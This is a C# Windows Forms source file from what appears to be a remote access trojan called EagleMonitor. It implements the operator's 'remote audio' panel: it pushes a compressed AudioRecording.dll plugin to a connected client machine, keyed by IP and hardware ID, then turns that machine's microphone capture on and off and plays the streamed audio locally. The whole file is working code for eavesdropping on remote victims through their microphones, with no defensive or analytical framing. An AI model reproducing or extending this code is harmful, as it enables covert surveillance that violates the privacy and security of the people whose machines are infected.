using EagleMonitor.Controls;
using EagleMonitor.Networking;
using NAudio.Wave;
using PacketLib;
using PacketLib.Packet;
using System;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Forms
{
    public partial class RemoteAudioForm : FormPattern
    {
        internal ClientHandler clientHandler { get; set; }
        public bool hasAlreadyConnected { get; set; }
        private string baseIp { get; set; }

        internal RemoteAudioForm(string baseIp)
        {
            hasAlreadyConnected = false;
            this.baseIp = baseIp;
            InitializeComponent();
        }

        private void RemoteAudioForm_Load(object sender, EventArgs e)
        {
            for (int i = 0; i < WaveOut.DeviceCount; i++)
            {
                WaveOutCapabilities deviceInfo = WaveOut.GetCapabilities(i);
                currentMachineDevicesGuna2ComboBox.Items.Add(deviceInfo.ProductName);
            }
            currentMachineDevicesGuna2ComboBox.SelectedIndex = 0;
        }

        private void RemoteAudio_Shown(object sender, EventArgs e)
        {
            RemoteAudioPacket remoteAudioPacket = new RemoteAudioPacket();
            remoteAudioPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\AudioRecording.dll"), 1);
            ClientHandler.ClientHandlersList[baseIp].SendPacket(remoteAudioPacket);
        }

        private async void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (captureGuna2ToggleSwitch.Checked)
            {
                if (audioDevicesGuna2ComboBox.Items.Count > 0)
                {
                    ClientHandler.ClientHandlersList[baseIp].audioHelper.waveOut.DeviceNumber = currentMachineDevicesGuna2ComboBox.SelectedIndex;
                    ClientHandler.ClientHandlersList[baseIp].audioHelper.waveOut.Init(ClientHandler.ClientHandlersList[baseIp].audioHelper.bufferedWaveProvider);
                    ClientHandler.ClientHandlersList[baseIp].audioHelper.waveOut.Play();

                    RemoteAudioCapturePacket remoteAudioCapturePacket = new RemoteAudioCapturePacket(PacketType.AUDIO_RECORD_ON);
                    remoteAudioCapturePacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\AudioRecording.dll"), 1);
                    remoteAudioCapturePacket.index = audioDevicesGuna2ComboBox.SelectedIndex;
                    this.loadingCircle1.Visible = true;
                    this.loadingCircle1.Active = true;
                    ClientHandler.ClientHandlersList[baseIp].SendPacket(remoteAudioCapturePacket);
                }
            }
            else
            {
                if (clientHandler != null)
                {
                    this.loadingCircle1.Visible = false;
                    this.loadingCircle1.Active = false;
                    RemoteAudioCapturePacket remoteAudioCapturePacket = new RemoteAudioCapturePacket(PacketType.AUDIO_RECORD_OFF);
                    remoteAudioCapturePacket.HWID = ClientHandler.ClientHandlersList[baseIp].HWID;

                    await Task.Run(() => this.clientHandler.SendPacket(remoteAudioCapturePacket));
                    await Task.Run(() => this.clientHandler.Dispose());
                    ClientHandler.ClientHandlersList[baseIp].audioHelper.waveFileWriter.Close();
                    ClientHandler.ClientHandlersList[baseIp].audioHelper.bufferedWaveProvider.ClearBuffer();
                    hasAlreadyConnected = false;
                    ClientHandler.ClientHandlersList[baseIp].audioHelper.currentFileName = "";
                }
            }
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void label2_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.FindForm().Handle, 161, 2, 0);
        }
    }
}
